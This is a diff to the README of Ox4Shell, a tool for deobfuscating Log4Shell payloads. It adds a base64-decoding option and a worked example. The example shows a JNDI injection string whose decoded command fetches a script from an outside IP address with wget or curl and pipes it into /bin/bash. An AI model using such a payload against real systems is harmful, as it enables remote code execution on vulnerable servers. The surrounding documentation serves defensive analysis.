@@ -4,7 +4,7 @@
 <p align="center">
     <img alt="maintained-oxeye" src="https://img.shields.io/badge/maintained%20by-oxeye.io-blueviolet"/>
     <img alt="python-3.8" src="https://img.shields.io/badge/python-3.8-green"/>
-    <img alt="version-1.0" src="https://img.shields.io/badge/version-1.0-blue"/>
+    <img alt="version-1.1" src="https://img.shields.io/badge/version-1.1-blue"/>
     <img alt="license-mit" src="https://img.shields.io/badge/license-MIT-lightgrey"/>
 </p>
 
@@ -27,6 +27,17 @@ After running Ox4Shell, it would transform into an intuitive and readable form:
 ${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
 ```
 
+This tool also identify and decode base64 commands
+For example, consider the following obfuscated payload:
+```text
+${jndi:ldap://<REDACTED_IP>:1389/Basic/Command/Base64/KHdnZXQgLU8gLSBodHRwOi8vMTg1LjI1MC4xNDguMTU3OjgwMDUvYWNjfHxjdXJsIC1vIC0gaHR0cDovLzE4NS4yNTAuMTQ4LjE1Nzo4MDA1L2FjYyl8L2Jpbi9iYXNoIA==}
+```
+
+After running Ox4Shell, the tool reveals the attacker’s intentions:
+```text
+${jndi:ldap://<REDACTED_IP>:1389/Basic/(wget -O - http://185.250.148.157:8005/acc||curl -o - http://185.250.148.157:8005/acc)|/bin/bash
+```
+
 ⚠️ We recommend running `Ox4Shell` with a provided file (`-f`) rather than an inline payload (`-p`), because certain 
 shell environments will escape important characters, therefore will yield inaccurate results. 
 
@@ -47,11 +58,12 @@ Ox4Shell - Deobfuscate Log4Shell payloads with ease.
     Created by https://oxeye.io
 
 General:
-  -h, --help            show this help message and exit
+  -h, --help            Show this help message and exit
   -d, --debug           Enable debug mode (default: False)
   -m MOCK, --mock MOCK  The location of the mock data JSON file that replaces certain values in the payload (default: mock.json)
   --max-depth MAX_DEPTH
                         The maximum number of iteration to perform on a given payload (default: 150)
+  --decode-base64       Payloads containing base64 will be decoded (default: False)
 
 Targets:
   Choose which target payloads to run Ox4Shell on
